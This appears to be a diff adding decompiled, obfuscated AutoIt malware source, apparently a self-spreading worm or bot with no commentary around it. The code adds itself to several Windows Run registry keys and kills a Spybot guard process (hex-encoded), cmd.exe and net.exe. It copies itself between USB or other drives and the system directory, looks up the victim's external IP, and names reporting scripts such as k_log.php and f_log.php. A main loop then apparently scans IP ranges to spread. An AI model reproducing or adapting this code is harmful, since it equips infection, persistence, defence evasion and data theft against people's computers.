+$Var0318 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & ".da"
+Global $Var0319 = @HomeDrive & "\" & $Var0316 & "\" & $Var0317 & "\"
+Global $Var031A = $Var0319 & $Var0318, $Var031B
+Global $Var031C
+$Var031D = ""
+$Var031E = ""
+$Var031F = ""
+$Var0320 = ""
+$Var0308 = ""
+$Var0321 = ""
+$Var0322 = ""
+$Var0323 = ""
+$Var0324 = ""
+$Var0325 = ""
+$Var0326 = ""
+$Var0327 = "a_log.php"
+$Var0328 = "f_log.php"
+$Var0329 = "e_log.php"
+$Var032A = "k_log.php"
+$Var032B = "l_log.php"
+$Var032C = "s_log.php"
+$Var032D = "d_log.php"
+$Var0302 = ""
+$Var032E = ""
+$Var02DD = 0
+$Var02DE = 0
+$Var02EB = 0
+$Var02E1 = 0
+$EncryptionKey = ""
+$Var0330 = ""
+$Var0331 = ""
+$Var0332 = ""
+$Var0333 = ""
+$Var0334 = ""
+$Var0335 = ""
+$Var0336 = ""
+$Var0337 = ""
+$Var0338 = ""
+$Var0339 = ""
+$Var033A = ""
+$Var033B = ""
+$Var033C = ""
+$Var033D = ""
+$Var033E = ""
+If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028E Then
+	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028F, "REG_SZ", @SystemDir & "\" & $Var028E)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028F, "REG_SZ", @SystemDir & "\" & $Var028E)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028F, "REG_SZ", @SystemDir & "\" & $Var028E)
+	If ProcessExists($Var0292) Then
+		ProcessClose($Var0292)
+		Sleep(0x01F4)
+		If ProcessExists($Var0292) Then
+			ProcessWaitClose($Var0292, 0x003C)
+		EndIf
+	EndIf
+	If ProcessExists("cmd.exe") Then
+		ProcessClose("cmd.exe")
+		Sleep(0x01F4)
+		If ProcessExists("cmd.exe") Then
+			ProcessWaitClose("cmd.exe", 0x003C)
+		EndIf
+	EndIf
+	If ProcessExists("net.exe") Then
+		ProcessClose("net.exe")
+		Sleep(0x01F4)
+		If ProcessExists("net.exe") Then
+			ProcessWaitClose("net.exe", 0x003C)
+		EndIf
+	EndIf
+	Fn00A4()
+	Fn00A2()
+	$Var02A7 = $Var028E
+	Fn00AA()
+	Sleep(10 * 0x03E8)
+	Sleep(10 * 0x003C * 0x03E8)
+	If ProcessExists($Var0292) Then
+		If FileGetVersion(@SystemDir & "\" & $Var028E) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
+			If RegRead($Var029A, "exp1") <> "" Then
+				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028F)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028F)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028F)
+				Fn00A3()
+			EndIf
+		EndIf
+	EndIf
+	Exit
+EndIf
+If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028C Then
+	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028D, "REG_SZ", @SystemDir & "\" & $Var028C)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028D, "REG_SZ", @SystemDir & "\" & $Var028C)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028D, "REG_SZ", @SystemDir & "\" & $Var028C)
+	If ProcessExists($Var0292) Then
+		If FileGetVersion(@SystemDir & "\" & $Var028C) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
+			If RegRead($Var029A, "exp1") <> "" Then
+				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028D)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028D)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028D)
+				Fn00A3()
+			EndIf
+		EndIf
+	EndIf
+	If ProcessExists($Var0292) Then
+		ProcessClose($Var0292)
+		Sleep(0x01F4)
+		If ProcessExists($Var0292) Then
+			ProcessWaitClose($Var0292, 0x003C)
+		EndIf
+	EndIf
+	If ProcessExists("cmd.exe") Then
+		ProcessClose("cmd.exe")
+		Sleep(0x01F4)
+		If ProcessExists("cmd.exe") Then
+			ProcessWaitClose("cmd.exe", 0x003C)
+		EndIf
+	EndIf
+	If ProcessExists("net.exe") Then
+		ProcessClose("net.exe")
+		Sleep(0x01F4)
+		If ProcessExists("net.exe") Then
+			ProcessWaitClose("net.exe", 0x003C)
+		EndIf
+	EndIf
+	Fn00A4()
+	Fn00A2()
+	$Var02A7 = $Var028C
+	Fn00A9()
+	Sleep(10 * 0x03E8)
+	Sleep(10 * 0x003C * 0x03E8)
+	If ProcessExists($Var0292) Then
+		If FileGetVersion(@SystemDir & "\" & $Var028C) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
+			If RegRead($Var029A, "exp1") <> "" Then
+				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028D)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028D)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028D)
+				Fn00A3()
+			EndIf
+		EndIf
+	EndIf
+	Exit
+EndIf
+If @ScriptDir = @SystemDir Then
+EndIf
+If @ScriptDir = @SystemDir Then
+	If Fn008F("df8g1sdf68g18er1g8re16", 1) = 0 Then
+		Exit
+	EndIf
+	Fn00EB()
+	$Var033F = $Var0297 & "!" & $Var02A7
+	$Var033F = Decrypt(1, $Var033F, $EncryptionKey, 1)
+	$Var02A8 = $Var02A7
+EndIf
+If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
+	$Var0340 = FileGetVersion(@SystemDir & "\" & $Var0292)
+	$Var0341 = FileGetVersion(@AutoItExe)
+	If ProcessExists($Var0292) Then
+		If $Var0341 > $Var0340 Then
+			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
+			$Var02A7 = StringMid(@AutoItExe, $Var0342)
+			Fn00A9()
+			Sleep(0x03E8)
+		EndIf
+	Else
+		$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
+		$Var02A7 = StringMid(@AutoItExe, $Var0342)
+		Fn00A9()
+		Sleep(0x03E8)
+	EndIf
+	If DriveGetType(@ScriptDir) = "FIXED" Then
+		Fn00A4()
+		Fn00A3()
+		Exit
+	EndIf
+ElseIf @ScriptDir = @SystemDir Then
+	Sleep(2 * 0x003C * 0x03E8)
+	If @ScriptFullPath = (@SystemDir & "\" & $Var0292) Or @ScriptFullPath = (@SystemDir & "\" & $Var0298) Then
+	Else
+		Fn00A3()
+	EndIf
+	If FileExists(@ScriptDir & "\" & $Var0295) And FileExists(@ScriptDir & "\" & $Var0294) Then
+		$Var0343 = FileReadLine(@ScriptDir & "\" & $Var0295, 9)
+		$Var0344 = FileReadLine(@ScriptDir & "\" & $Var0294, 9)
+		If $Var0343 <> $Var0344 Then
+			Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
+			Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
+		EndIf
+	Else
+		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
+		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
+	EndIf
+	If FileExists(@ScriptDir & "\" & $Var0295) Then
+		$Var0345 = FileReadLine(@ScriptDir & "\" & $Var0295, 9)
+		$Var0345 = StringTrimLeft($Var0345, 1)
+		$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
+		$Var0345 = StringSplit($Var0345, "!")
+		For $Var0346 = 1 To $Var0345[0]
+			If $Var0345[0] = 2 Then
+				If $Var0345[1] = $Var0297 Then
+					$Var02A8 = $Var0345[2]
+					$Var02A7 = $Var0345[2]
+				Else
+					Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
+				EndIf
+			Else
+				Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
+			EndIf
+		Next
+	Else
+		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
+	EndIf
+	If FileExists(@ScriptDir & "\" & $Var0294) Then
+		$Var0345 = FileReadLine(@ScriptDir & "\" & $Var0294, 9)
+		$Var0345 = StringTrimLeft($Var0345, 1)
+		$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
+		$Var0345 = StringSplit($Var0345, "!")
+		For $Var0346 = 1 To $Var0345[0]
+			If $Var0345[0] = 2 Then
+				If $Var0345[1] = $Var0297 Then
+					$Var02A8 = $Var0345[2]
+					$Var02A7 = $Var0345[2]
+				Else
+					Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
+				EndIf
+			Else
+				Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
+			EndIf
+		Next
+	Else
+		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
+	EndIf
+Else
+	$Var0340 = FileGetVersion(@SystemDir & "\" & $Var0292)
+	$Var0341 = FileGetVersion(@AutoItExe)
+	If ProcessExists($Var0292) Then
+		If $Var0341 > $Var0340 Then
+			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
+			$Var02A7 = StringMid(@AutoItExe, $Var0342)
+			Fn00A9()
+			Sleep(0x03E8)
+		EndIf
+	Else
+		$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
+		$Var02A7 = StringMid(@AutoItExe, $Var0342)
+		Fn00A9()
+		Sleep(0x03E8)
+	EndIf
+	Exit
+EndIf
+If @ScriptDir = @SystemDir Then
+	If RegRead($Var029A, "a") = "1" Then
+		$Var02D1 = 1
+	EndIf
+	If RegRead($Var029A, "b") = "1" Then
+		$Var02D2 = 1
+	EndIf
+	If RegRead($Var029A, "a") = "0" Then
+		$Var02D1 = 0
+	EndIf
+	If RegRead($Var029A, "b") = "0" Then
+		$Var02D2 = 0
+	EndIf
+	If RegRead($Var029A, "eggol") = "1" Then
+		$Var02C5 = 1
+	EndIf
+	If RegRead($Var029A, "eggol") = "0" Then
+		$Var02C5 = 0
+	EndIf
+	If RegRead($Var029A, "exp1") <> "" Then
+	Else
+		RegWrite($Var029A, "exp1", "REG_SZ", Decrypt(1, @YDAY * 1, $EncryptionKey, 4))
+		RegWrite($Var029A, "dreg", "REG_SZ", Decrypt(1, @YEAR * 1, $EncryptionKey, 4))
+		RegWrite($Var029A, "fir", "REG_SZ", "x")
+	EndIf
+	$Var0347 = "http://www.whatismyip.com/automation/n09230945.asp"
+	$Var0348 = $Var0347
+	$Var0349 = $Var0347
+	$Var034A = Fn00B1()
+	If $Var034A = @IPAddress1 Then
+		$Var02B9 = 1
+	EndIf
+	$Var034B = StringSplit($Var034A, ".")
+	If $Var034B[0] = 4 Then
+		$Var02B1 = $Var034B[1]
+		$Var02B2 = $Var034B[2]
+		$Var02B3 = $Var034B[3]
+		$Var02B4 = 0
+	Else
+		$Var02B1 = 0x007F
+		$Var02B2 = 0
+		$Var02B3 = 0
+		$Var02B4 = 1
+	EndIf
+	$Var034C = @IPAddress1
+	If $Var034C = "127.0.0.1" Then
+		$Var034C = @IPAddress1
+		$Var034D = StringSplit($Var034C, ".")
+		If $Var034D[0] = 4 Then
+			$Var02B5 = $Var034D[1]
+			$Var02B6 = $Var034D[2]
+			$Var02B7 = $Var034D[3]
+			$Var02B8 = 0
+		EndIf
+	Else
+		$Var034D = StringSplit($Var034C, ".")
+		If $Var034D[0] = 4 Then
+			$Var02B5 = $Var034D[1]
+			$Var02B6 = $Var034D[2]
+			$Var02B7 = $Var034D[3]
+			$Var02B8 = 0
+		EndIf
+	EndIf
+	Fn00B4()
+	Fn00A0()
+	Fn009C()
+	If $Var02D7 = 1 And RegRead($Var029A, "rem1") = "1" Then
+		$Var02CA = "usbspread"
+		$Var02C8 = "Usb2System"
+		$Var02CB = RegRead($Var029A, "rem")
+		$Var034E = $Var0337
+		$Var02CC = "none"
+		Fn00A6()
+		RegDelete($Var029A, "rem1")
+	EndIf
+	If $Var02D7 = 1 And RegRead($Var029A, "fix1") = "1" Then
+		$Var02CA = "IPspreader"
+		$Var02C8 = "Drive2System"
+		$Var02CB = RegRead($Var029A, "fix")
+		$Var034E = $Var0338
+		$Var02CC = "none"
+		Fn00A6()
+		RegDelete($Var029A, "fix1")
+	EndIf
+	$Var034F = DriveGetDrive("FIXED")
+	If Not @error Then
+		For $Var0350 = 1 To $Var034F[0]
+			If DriveStatus($Var034F[$Var0350]) = "READY" Then
+				FileWrite($Var034F[$Var0350] & "\" & $Var0297, "")
+				FileSetAttrib($Var034F[$Var0350] & "\" & $Var0297, "+RASH")
+			EndIf
+		Next
+	EndIf
+	If RegRead($Var029A, "regexp") = Cos(@YDAY * 1) Then
+	Else
+		RegWrite($Var029A, "regexp", "REG_SZ", Cos(@YDAY * 1))
+		$Var034E = $Var0330
+		$Var02CA = @OSVersion
+		$Var02C8 = "Online"
+		$Var02CB = "none"
+		$Var02CC = "none"
+		Fn00A6()
+	EndIf
+EndIf
+Fn00B4()
+If @ScriptDir = @SystemDir Then
+	$Var0351 = @HOUR * 1
+	$Var0352 = @HOUR * 1
+	$Var0353 = @HOUR * 1
+	$Var0354 = @MIN * 1
+	$Var0355 = @HOUR * 1
+	$Var0356 = @HOUR * 1
+	$Var0357 = 0
+	$Var02AE = TimerInit()
+	$Var0358 = TimerInit()
+	$Var0359 = TimerInit()
+	$Var035A = Random(6, 8, 1)
+	$Var035B = 0
+	While 1
+		Sleep(10)
+		If $Var02D7 = 0 Then
+			If $Var0353 <> @HOUR * 1 Then
+				$Var0353 = @HOUR * 1
+				$Var035B = 0
+				Fn009C()
+				Fn00A0()
+			EndIf
+		EndIf
+		If $Var02D1 = 1 Then
+			Sleep(10)
+		EndIf
+		If $Var02D2 = 1 Then
+			Sleep(0x03E8)
+		EndIf
+		Sleep(5)
+		If $Var02D1 = 0 Then
+			If $Var02D0 = 1 Then
+				If $Var0352 <> @HOUR * 1 Then
+					$Var02D0 = 0
+				EndIf
+			EndIf
+			If $Var02D0 = 0 Then
+				$Var035C = Round(TimerDiff($Var0358), 0) / 0x03E8
+				If $Var035C > 10 Then
+					$Var035C = 0
+					$Var0358 = 0
+					$Var0358 = TimerInit()
+					Fn009E()
+				EndIf
+			EndIf
+		EndIf
+		If @HOUR * 1 <> $Var0355 And @MIN * 1 = $Var0354 Then
+			$Var0355 = @HOUR * 1
+			$Var035B = $Var035B + 1
+			If $Var035B = $Var035A Then
+				$Var035B = 0
+				$Var035A = Random(10, 0x0014, 1)
+				Fn009C()
+				Fn00A0()
+			EndIf
+		EndIf
+		Sleep(5)
+		If $Var02CF = 1 Then
+			If $Var0351 <> @HOUR * 1 Then
+				$Var0351 = @HOUR * 1
+				$Var035D = 0x0190
+				$Var02CF = 0
+			EndIf
+		Else
+			If @IPAddress1 = "127.0.0.1" Then
+			Else
+				If $Var02D2 = 0 Then
+					If $Var02B1 = 0x007F And $Var02B2 = 0 And $Var02B3 = 0 And $Var02B4 = 1 Then
+						Sleep(0x0064)
+					Else
+						Fn00AB()
+					EndIf
+					If $Var02D8 = 1 Then
+						Fn00AD()
+					EndIf
+					If $Var02D8 = 2 Then
+						Fn00AD()
+						If $Var02B8 = 0x00FF Then
+							$Var02B8 = 0
+							$Var02D8 = 0
+						EndIf
+					EndIf
+				EndIf
+			EndIf
+		EndIf
+		$Var02AF = Round(TimerDiff($Var02AE), 0) / 0x03E8
+		If $Var02AF > 0x0258 Then
+			$Var02AF = 0
+			$Var02AE = 0
+			$Var02AE = TimerInit()
+			Fn00B4()
+		EndIf
+		$Var035E = Round(TimerDiff($Var0359), 0) / 0x03E8
+		If $Var035E > 0x003C Then
+			$Var035E = 0
+			$Var0359 = 0
+			$Var0359 = TimerInit()
+			Fn009F()
+		EndIf
+	WEnd
+EndIf
